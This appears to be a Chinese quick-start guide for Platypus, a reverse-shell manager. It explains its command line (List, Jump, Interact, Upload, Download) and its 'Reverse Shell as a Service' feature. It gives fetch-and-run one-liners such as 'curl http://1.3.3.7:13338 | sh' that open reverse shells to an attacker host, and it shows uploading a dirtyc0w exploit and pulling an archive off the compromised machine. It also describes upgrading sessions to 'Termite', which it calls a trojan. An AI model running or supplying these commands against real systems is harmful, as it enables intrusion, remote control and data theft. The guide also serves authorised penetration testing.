# 快速上手

!!! Tips
    您可以在[**这里**](https://github.com/WangYihang/Platypus/releases)下载到最新的 Release 版，
    您也可以参考[**这里**](./build.md)直接从源码编译得到 Platypus 的可执行文件。

## 运行

!!! Hint
    这里假设 Platypus 运行在具有公网 IP 的服务器上，其 IP 为 1.3.3.7。

### Linux

```
./platypus_linux_amd64
```
### Windows

```
.\platypus_windows_amd64.exe
```

如果您对 Platypus 的具体启动流程感兴趣，可以参考[本文](./run.md)。

## 与 Platypus 交互

!!! Hint
    Platypus 提供 3 种与之交互的方式。

    * [命令行](./interact/cli.md)
    * [Web 界面](./interact/web.md)
    * [Python SDK](./interact/python-sdk.md)

这里只介绍最基础的**命令行**模式的一些命令。

!!! Hint
    Platypus 对命令的大小写不敏感并且支持 Tab 自动对命令进行补全，您可以输入命令前缀然后按下 ++tab++ 键即可自动补全。

Platypus 的命令行模式支持 `Help`、`List`、`Jump`、`Download`、`Upload` 以及 `Interact` 等命令。

### Help

打印命令的帮助信息。

#### 列出所有受支持的命令

```bash
» Help
```

#### 列出 List 命令的帮助信息

```bash
» Help List
```

### List

列出当前正在监听的服务器以及每一个服务器上存活的 Shell。

```bash
» List
2021/08/11 22:46:10 Listing 2 listening servers
2021/08/11 22:46:10 [9442daedd052d7cdfebc43092a4a3050] is listening on 0.0.0.0:13337, 0 clients
2021/08/11 22:46:10 [1b7fb280df68ceebae36060c938a2ced] is listening on 0.0.0.0:13338, 0 clients
```

### Jump

!!! Tips
    Platypus 会根据配置文件中的[哈希计算模式](./hashing.md)对每一个上线的 Shell 计算哈希，该哈希会作为该 Shell 的唯一标识。

跳转到某一个 Shell 对其进行操作。

例如：

```
» Jump 1b7fb280df68ceebae36060c938a2ced
```

跳转成功后，终端的命令提示符将会修改为当前 Shell 的相关信息。
后续的命令（如：`Interact`）将会直接对当前的 Shell 进行操作。

### Interact

当跳转到某一个 Shell 之后，与之进行交互。

!!! Warning
    * 如果您直接执行 Interact 命令得到的 Shell 将会与 netcat 类似，并非纯交互式 Shell。
    * 如果您想要退出当前正在交互的 Shell，可以直接输入 `exit` 即可返回。
    * 如果您希望得到一个**像 SSH 一样好用丝滑的 Shell** 请参考[本文](./interactive.md)。

### Upload / Download

当跳转到某一个 Shell 之后，上传或下载文件。

#### 上传文件

将 Platypus 当前文件夹下的 `dirtyc0w.c` 上传至当前交互主机的 `/tmp/dirtyc0w.c`。
```bash
» Upload ./dirtyc0w.c /tmp/dirtyc0w.c
```

#### 下载文件

将当前交互主机的 `/tmp/www.tar.gz` 下载至 Platypus 当前文件夹下的 `www.tar.gz` 中。

```bash
» Download /tmp/www.tar.gz ./www.tar.gz
```

## 反弹一个反向 Shell

受到 [lukechilds](https://github.com/lukechilds) 的 [reverse-shell](https://github.com/lukechilds/reverse-shell) 项目的启发，Platypus 支持 Reverse Shell as a Serivce (RaaS)，基本语法与其相同，但增加了一些不同语言的反向 Shell 的 Payload。

您可以直接在目标机器上执行如下命令得到一个反向 Shell，从此不用再记忆各种繁琐的反向 Shell 命令。
如果您希望了解更加高级的 RaaS 的用法，请参考[本文](./../../RaaS.md)。

```bash
curl http://1.3.3.7:13338 | sh
```

### 反弹 Shell 至当前 Platypus（`1.3.3.7:13338`）

```bash
curl http://1.3.3.7:13338 | sh
curl http://1.3.3.7:13338/python | sh
```

### 反弹 Shell 至其他平台（`2.3.3.7:4444`）

```bash
curl http://1.3.3.7:13338/2.3.3.7/4444 | sh
curl http://1.3.3.7:13338/2.3.3.7/4444/ruby | sh
```

反弹成功之后，Platypus 会对新上线的 Shell 进行基础的信息搜集（如：操作系统，用户名等），
当信息搜集结束后，即可利用 Platypus 与之进行交互。

## 升级至 Termite（推荐）

当您已经获得了一个反向 Shell 之后，强烈建议您使用 `Upgrade` 命令将其升级为更稳定可靠并且提供加密机制等其他非常有用的功能的 Termite Shell。

!!! Termite
    Termite 是 Platypus 的二进制木马，提供流量加密、交互式 Shell 等功能。

当您已经使用 `Jump` 命令跳转到目标 Shell 之后，您可以使用 `Upgrade 1.3.3.7:13337` 来将当前的明文 Shell 提升为更加可靠的 Termite，稍等片刻，您将会看到一个带有 `[Encrypted]` 标记的 Shell 上线。

Termite 提供了多种有用功能，如：

* 完全交互式 Shell（使用就像 SSH 一样丝滑），并且可以多人同时启动多个 Shell 而互不影响。
* 4 种不同的[隧道](./tunnel.md)功能
* 更加稳定可靠的文件操作

与 Termite 交互的逻辑与通常的反向 Shell 一致，即：`Jump` 然后 `Interact`。